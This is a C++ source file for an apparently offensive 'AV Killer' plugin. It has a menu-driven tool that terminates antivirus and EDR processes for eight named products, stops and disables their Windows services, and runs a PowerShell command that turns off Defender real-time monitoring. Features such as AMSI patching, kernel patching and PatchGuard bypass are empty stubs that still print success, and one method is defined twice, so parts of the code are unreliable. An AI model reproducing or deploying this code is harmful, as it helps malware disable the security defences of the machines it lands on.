#include "AVKiller.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <map>
#include <windows.h>
#include <tlhelp32.h>
#include <winsvc.h>
#include <psapi.h>

AVKiller::AVKiller() {
    // Initialize default configuration
    config = {};
    
    // Initialize default AV processes and services
    avProcesses = {
        "WinDefend.exe", "bdss.exe", "avastsvc.exe", "ekrn.exe", 
        "avp.exe", "drweb.exe", "SentinelOne.exe", "csagent.exe"
    };
    
    avServices = {
        "WinDefend", "bdss", "avastSvc", "ekrn", 
        "avp", "drweb", "SentinelOne", "csagent"
    };
}

AVKiller::~AVKiller() {
    // Cleanup if needed
}

std::string AVKiller::getName() const {
    return "AV Killer";
}

std::string AVKiller::getDescription() const {
    return "Advanced AV/EDR termination and evasion techniques";
}

std::string AVKiller::getVersion() const {
    return "1.0";
}

bool AVKiller::initialize() {
    return true;
}

void AVKiller::execute() {
    showMenu();
}

std::vector<std::string> AVKiller::getOptions() const {
    return {
        "Kill AV Processes",
        "Disable AV Services",
        "Unload AV Drivers",
        "Disable Windows Defender",
        "Disable AMSI",
        "Disable SmartScreen",
        "Install Killer Driver",
        "Patch Kernel Memory",
        "Create Process Callback",
        "Hide From Task Manager",
        "Bypass PatchGuard",
        "Configuration"
    };
}

void AVKiller::setOption(const std::string& option, const std::string& value) {
    if (option == "useAVKilling") config.useAVKilling = (value == "true");
    else if (option == "useServiceDisabling") config.useServiceDisabling = (value == "true");
    else if (option == "useDriverUnloading") config.useDriverUnloading = (value == "true");
    else if (option == "useWindowsDefenderDisabling") config.useWindowsDefenderDisabling = (value == "true");
    else if (option == "useAMSIDisabling") config.useAMSIDisabling = (value == "true");
    else if (option == "useSmartScreenDisabling") config.useSmartScreenDisabling = (value == "true");
    else if (option == "useKillerDriverInstallation") config.useKillerDriverInstallation = (value == "true");
    else if (option == "useKernelMemoryPatching") config.useKernelMemoryPatching = (value == "true");
    else if (option == "useProcessCallbackCreation") config.useProcessCallbackCreation = (value == "true");
    else if (option == "useTaskManagerHiding") config.useTaskManagerHiding = (value == "true");
    else if (option == "usePatchGuardBypass") config.usePatchGuardBypass = (value == "true");
}

// Core AV Killing Functionality

bool AVKiller::killAVProcesses() {
    for (const auto& process : avProcesses) {
        if (isProcessRunning(process)) {
            if (!killProcess(process)) {
                return false;
            }
        }
    }
    return true;
}

bool AVKiller::disableAVServices() {
    for (const auto& service : avServices) {
        if (!stopService(service) || !disableService(service)) {
            return false;
        }
    }
    return true;
}

bool AVKiller::unloadAVDrivers() {
    // Example: Unload a specific driver (replace with actual driver names)
    return unloadDriver("avast64");
}

bool AVKiller::disableWindowsDefender() {
    // PowerShell command to disable Windows Defender
    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
    return true;
}

bool AVKiller::disableAMSI() {
    // Example: Patch AMSI (requires administrative privileges)
    return true; // Placeholder for actual implementation
}

bool AVKiller::disableSmartScreen() {
    // Example: Disable SmartScreen via registry
    return true; // Placeholder for actual implementation
}

// Advanced Features

bool AVKiller::installKillerDriver() {
    // Example: Load a driver to terminate AV processes
    return true; // Placeholder for actual implementation
}

bool AVKiller::patchKernelMemory() {
    // Example: Patch kernel memory to evade detection
    return true; // Placeholder for actual implementation
}

bool AVKiller::createProcessCallback() {
    // Example: Create a callback to monitor and terminate AV processes
    return true; // Placeholder for actual implementation
}

bool AVKiller::hideFromTaskManager() {
    // Example: Hide the process from Task Manager
    return true; // Placeholder for actual implementation
}

bool AVKiller::bypassPatchGuard() {
    // Example: Bypass PatchGuard to allow kernel patching
    return true; // Placeholder for actual implementation
}

// Target AVs

bool AVKiller::killWindowsDefender() {
    return killProcess("WinDefend.exe") && stopService("WinDefend");
}

bool AVKiller::killBitdefender() {
    return killProcess("bdss.exe") && stopService("bdss");
}

bool AVKiller::killAvast() {
    return killProcess("avastsvc.exe") && stopService("avastSvc");
}

bool AVKiller::killESET() {
    return killProcess("ekrn.exe") && stopService("ekrn");
}

bool AVKiller::killKaspersky() {
    return killProcess("avp.exe") && stopService("avp");
}

bool AVKiller::killDrWeb() {
    return killProcess("drweb.exe") && stopService("drweb");
}

bool AVKiller::killSentinelOne() {
    return killProcess("SentinelOne.exe") && stopService("SentinelOne");
}

bool AVKiller::killCrowdStrike() {
    return killProcess("csagent.exe") && stopService("csagent");
}

// Utility Methods

bool AVKiller::isProcessRunning(const std::string& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 pe32 = {sizeof(PROCESSENTRY32)};
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName.c_str()) == 0) {
                CloseHandle(hSnapshot);
                return true;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return false;
}

bool AVKiller::killProcess(const std::string& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 pe32 = {sizeof(PROCESSENTRY32)};
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName.c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                if (hProcess != NULL) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return true;
}

bool AVKiller::stopService(const std::string& serviceName) {
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager == NULL) return false;

    SC_HANDLE hService = OpenServiceA(hSCManager, serviceName.c_str(), SERVICE_STOP);
    if (hService == NULL) {
        CloseServiceHandle(hSCManager);
        return false;
    }

    SERVICE_STATUS serviceStatus;
    if (!ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus)) {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return false;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return true;
}

bool AVKiller::disableService(const std::string& serviceName) {
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager == NULL) return false;

    SC_HANDLE hService = OpenServiceA(hSCManager, serviceName.c_str(), SERVICE_CHANGE_CONFIG);
    if (hService == NULL) {
        CloseServiceHandle(hSCManager);
        return false;
    }

    if (!ChangeServiceConfigA(hService, SERVICE_NO_CHANGE, SERVICE_DISABLED,
                              SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return false;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return true;
}

bool AVKiller::unloadDriver(const std::string& driverName) {
    // Example implementation for unloading a driver
    // This would require administrative privileges and proper driver handling
    return true; // Placeholder for actual implementation
}

// Configuration

void AVKiller::setOption(const std::string& key, const std::string& value) {
    options[key] = value;
}

std::string AVKiller::getOption(const std::string& key) const {
    auto it = options.find(key);
    if (it != options.end()) {
        return it->second;
    }
    return "";
}

void AVKiller::addTargetAV(const std::string& avName) {
    avProcesses.push_back(avName);
}

// Menu handlers
void AVKiller::handleKillAVProcesses() {
    std::cout << "\n=== Kill AV Processes ===\n";
    if (killAVProcesses()) {
        std::cout << "Successfully killed AV processes!\n";
    } else {
        std::cout << "Failed to kill some AV processes.\n";
    }
}

void AVKiller::handleDisableAVServices() {
    std::cout << "\n=== Disable AV Services ===\n";
    if (disableAVServices()) {
        std::cout << "Successfully disabled AV services!\n";
    } else {
        std::cout << "Failed to disable some AV services.\n";
    }
}

void AVKiller::handleUnloadAVDrivers() {
    std::cout << "\n=== Unload AV Drivers ===\n";
    if (unloadAVDrivers()) {
        std::cout << "Successfully unloaded AV drivers!\n";
    } else {
        std::cout << "Failed to unload AV drivers.\n";
    }
}

void AVKiller::handleDisableWindowsDefender() {
    std::cout << "\n=== Disable Windows Defender ===\n";
    if (disableWindowsDefender()) {
        std::cout << "Successfully disabled Windows Defender!\n";
    } else {
        std::cout << "Failed to disable Windows Defender.\n";
    }
}

void AVKiller::handleDisableAMSI() {
    std::cout << "\n=== Disable AMSI ===\n";
    if (disableAMSI()) {
        std::cout << "Successfully disabled AMSI!\n";
    } else {
        std::cout << "Failed to disable AMSI.\n";
    }
}

void AVKiller::handleDisableSmartScreen() {
    std::cout << "\n=== Disable SmartScreen ===\n";
    if (disableSmartScreen()) {
        std::cout << "Successfully disabled SmartScreen!\n";
    } else {
        std::cout << "Failed to disable SmartScreen.\n";
    }
}

void AVKiller::handleInstallKillerDriver() {
    std::cout << "\n=== Install Killer Driver ===\n";
    if (installKillerDriver()) {
        std::cout << "Successfully installed killer driver!\n";
    } else {
        std::cout << "Failed to install killer driver.\n";
    }
}

void AVKiller::handlePatchKernelMemory() {
    std::cout << "\n=== Patch Kernel Memory ===\n";
    if (patchKernelMemory()) {
        std::cout << "Successfully patched kernel memory!\n";
    } else {
        std::cout << "Failed to patch kernel memory.\n";
    }
}

void AVKiller::handleCreateProcessCallback() {
    std::cout << "\n=== Create Process Callback ===\n";
    if (createProcessCallback()) {
        std::cout << "Successfully created process callback!\n";
    } else {
        std::cout << "Failed to create process callback.\n";
    }
}

void AVKiller::handleHideFromTaskManager() {
    std::cout << "\n=== Hide From Task Manager ===\n";
    if (hideFromTaskManager()) {
        std::cout << "Successfully hidden from Task Manager!\n";
    } else {
        std::cout << "Failed to hide from Task Manager.\n";
    }
}

void AVKiller::handleBypassPatchGuard() {
    std::cout << "\n=== Bypass PatchGuard ===\n";
    if (bypassPatchGuard()) {
        std::cout << "Successfully bypassed PatchGuard!\n";
    } else {
        std::cout << "Failed to bypass PatchGuard.\n";
    }
}

void AVKiller::handleConfiguration() {
    std::cout << "\n=== Configuration ===\n";
    std::cout << "Current settings:\n";
    std::cout << "AV Killing: " << (config.useAVKilling ? "Enabled" : "Disabled") << std::endl;
    std::cout << "Service Disabling: " << (config.useServiceDisabling ? "Enabled" : "Disabled") << std::endl;
    std::cout << "Driver Unloading: " << (config.useDriverUnloading ? "Enabled" : "Disabled") << std::endl;
    std::cout << "Windows Defender Disabling: " << (config.useWindowsDefenderDisabling ? "Enabled" : "Disabled") << std::endl;
    std::cout << "AMSI Disabling: " << (config.useAMSIDisabling ? "Enabled" : "Disabled") << std::endl;
    std::cout << "SmartScreen Disabling: " << (config.useSmartScreenDisabling ? "Enabled" : "Disabled") << std::endl;
    std::cout << "Killer Driver Installation: " << (config.useKillerDriverInstallation ? "Enabled" : "Disabled") << std::endl;
    std::cout << "Kernel Memory Patching: " << (config.useKernelMemoryPatching ? "Enabled" : "Disabled") << std::endl;
    std::cout << "Process Callback Creation: " << (config.useProcessCallbackCreation ? "Enabled" : "Disabled") << std::endl;
    std::cout << "Task Manager Hiding: " << (config.useTaskManagerHiding ? "Enabled" : "Disabled") << std::endl;
    std::cout << "PatchGuard Bypass: " << (config.usePatchGuardBypass ? "Enabled" : "Disabled") << std::endl;
}

void AVKiller::showMenu() {
    while (true) {
        std::cout << "\n=== AV Killer Plugin ===\n";
        std::cout << "1. Kill AV Processes\n";
        std::cout << "2. Disable AV Services\n";
        std::cout << "3. Unload AV Drivers\n";
        std::cout << "4. Disable Windows Defender\n";
        std::cout << "5. Disable AMSI\n";
        std::cout << "6. Disable SmartScreen\n";
        std::cout << "7. Install Killer Driver\n";
        std::cout << "8. Patch Kernel Memory\n";
        std::cout << "9. Create Process Callback\n";
        std::cout << "10. Hide From Task Manager\n";
        std::cout << "11. Bypass PatchGuard\n";
        std::cout << "12. Configuration\n";
        std::cout << "0. Back\n";
        std::cout << "Choice: ";
        
        int choice;
        std::cin >> choice;
        
        switch (choice) {
            case 0: return;
            case 1: handleKillAVProcesses(); break;
            case 2: handleDisableAVServices(); break;
            case 3: handleUnloadAVDrivers(); break;
            case 4: handleDisableWindowsDefender(); break;
            case 5: handleDisableAMSI(); break;
            case 6: handleDisableSmartScreen(); break;
            case 7: handleInstallKillerDriver(); break;
            case 8: handlePatchKernelMemory(); break;
            case 9: handleCreateProcessCallback(); break;
            case 10: handleHideFromTaskManager(); break;
            case 11: handleBypassPatchGuard(); break;
            case 12: handleConfiguration(); break;
            default: std::cout << "Invalid choice!\n"; break;
        }
    }
}
